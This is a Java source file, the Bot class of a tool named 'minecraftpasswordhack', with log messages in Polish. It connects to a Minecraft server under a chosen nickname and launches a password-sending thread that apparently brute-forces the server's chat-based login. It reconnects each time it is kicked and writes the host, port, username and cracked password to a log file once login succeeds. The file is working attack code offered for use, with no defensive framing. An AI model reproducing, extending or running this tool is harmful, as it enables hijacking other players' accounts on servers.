package xyz.minecraftpasswordhack.objects;

import java.net.Proxy;

import org.spacehq.mc.auth.data.GameProfile;
import org.spacehq.mc.protocol.MinecraftProtocol;
import org.spacehq.mc.protocol.packet.ingame.client.ClientChatPacket;
import org.spacehq.mc.protocol.packet.ingame.server.*;
import org.spacehq.packetlib.Client;
import org.spacehq.packetlib.event.session.*;
import org.spacehq.packetlib.tcp.TcpSessionFactory;

import xyz.minecraftpasswordhack.Main;
import xyz.minecraftpasswordhack.threads.PasswordSending;
import xyz.minecraftpasswordhack.utils.PasswordUtil;

public class Bot {

	private final String ip, nick;
	private final int port;
	private final Proxy proxy;
	private boolean stopped;
	
	public Bot(String ip, int port, String nick) {
		this.ip = ip;
		this.port = port;
		this.nick = nick;
		this.proxy = Proxy.NO_PROXY;
		this.stopped = false;
	}
	
	public void connect() {
		final Client c = new Client(this.ip, this.port, new MinecraftProtocol(this.nick), new TcpSessionFactory(this.proxy));
		c.getSession().addListener(new SessionAdapter() {
			@Override
			public void packetReceived(PacketReceivedEvent event) {
				if (event.getPacket() instanceof ServerJoinGamePacket) {
					Main.getLogger().info("Polaczono pomyslnie. Rozpoczynam prace...");
					new Thread(new PasswordSending(event.getSession())).start();
				} else if (event.getPacket() instanceof ServerChatPacket) {
					final ServerChatPacket p = event.getPacket();
					final String message = p.getMessage().getFullText();
					if (message.contains(Main.getConfig().getLoginSucessMessage())) {
						setStopped(true);
						c.getSession().disconnect("finished!");
					}
				}
			}

			@Override
			public void packetSent(PacketSentEvent event) {
				if (event.getPacket() instanceof ClientChatPacket) {
					final GameProfile p = event.getSession().getFlag("profile");
					final ClientChatPacket pack = event.getPacket();
					System.out.println(p.getName() + " >> " + pack.getMessage());
				}
			}

			@Override
			public void disconnected(DisconnectedEvent event) {
				if (!isStopped()) {
					Main.getLogger().info("Ponowne laczenie z powodu wyrzucenia (Powod: " + event.getReason() + ")");
					connect();
				} else {
					final String newLine = System.lineSeparator();
					final String str = "###################################" + newLine
							+ "hostname=" + ip + newLine 
							+ "port=" + port + newLine
							+ "username=" + nick + newLine
							+ "password=" + PasswordUtil.getCurrentPassword() + newLine
							+ "###################################" + newLine + newLine;
					Main.getConfig().writeToLogs(str);
					Main.getLogger().info("Praca zakonczona. Zajrzyj do logs.txt!");
					System.exit(0);
				}
			}
		});
		c.getSession().connect();
	}

	public String getIp() {
		return ip;
	}

	public int getPort() {
		return port;
	}

	public String getNick() {
		return nick;
	}

	public Proxy getProxy() {
		return proxy;
	}

	public boolean isStopped() {
		return stopped;
	}

	public void setStopped(boolean stopped) {
		this.stopped = stopped;
	}
}